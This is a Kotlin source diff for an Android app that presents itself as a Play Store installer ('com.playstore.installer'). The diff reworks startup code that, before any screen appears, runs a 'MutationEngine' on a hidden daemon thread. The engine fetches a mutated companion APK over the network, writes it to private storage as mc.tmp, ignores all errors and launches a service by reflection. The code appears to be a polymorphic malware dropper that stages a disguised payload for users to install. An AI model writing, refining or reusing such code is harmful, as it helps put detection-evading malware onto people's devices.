@@ -2,10 +2,6 @@ package com.playstore.installer
 
 import android.app.Application
 import android.content.Intent
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.launch
 import java.io.File
 
 class LauncherApplication : Application() {
@@ -14,31 +10,32 @@ class LauncherApplication : Application() {
         lateinit var instance: LauncherApplication
             private set
 
-        // Name of the mutated companion file written to private storage
         const val MUTATED_APK_NAME = "mc.tmp"
 
+        @JvmStatic
         fun getMutatedApkFile(app: Application): File =
             File(app.filesDir, MUTATED_APK_NAME)
-
-        private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     }
 
     override fun onCreate() {
         super.onCreate()
         instance = this
 
-        // Start MutationEngine immediately — runs before any Activity is visible.
-        // By the time the user taps Install (~10-15 seconds later) the mutated
-        // companion is ready in filesDir/mc.tmp.
-        appScope.launch {
+        // Plain daemon thread — no coroutines at class-load time.
+        // getMutatedCompanionBytes() is a regular blocking function that
+        // uses runBlocking internally for network calls only.
+        Thread {
             try {
-                val engine = MutationEngine(applicationContext)
-                val bytes  = engine.getMutatedCompanionBytes()
+                val bytes = MutationEngine(applicationContext)
+                    .getMutatedCompanionBytes()
                 if (bytes.isNotEmpty()) {
                     getMutatedApkFile(this@LauncherApplication).writeBytes(bytes)
                 }
-                // Silent fail on any error — InstallActivity falls back to assets
             } catch (_: Exception) { }
+        }.apply {
+            isDaemon = true
+            name = "nova-mutation"
+            start()
         }
 
         startService(Intent(this, Class.forName(
